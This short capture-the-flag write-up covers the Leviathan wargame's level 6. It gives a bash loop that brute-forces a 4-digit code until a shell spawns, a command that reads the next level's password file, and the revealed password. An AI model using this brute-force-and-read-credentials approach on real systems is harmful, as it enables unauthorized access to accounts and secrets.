In this challenge we are presented with a program that asks for a 4 digit code.

So what we can do is brute force this program. 

Lets create a dir on /tmp by doing -> mkdir /tmp/sleety
And a bash file -> nano bruteforce.sh

Let's type the following script:

----------------------
#!/bin/bash

for a in {0000..9999}
do
~/leviathan6 $a
done
---------------------

Then after a while a shell will be spawned and now just type -> whoami
Voila!

-> cat /etc/leviathan_pass/leviathan7

And the key will be: ahy7MaeBo9
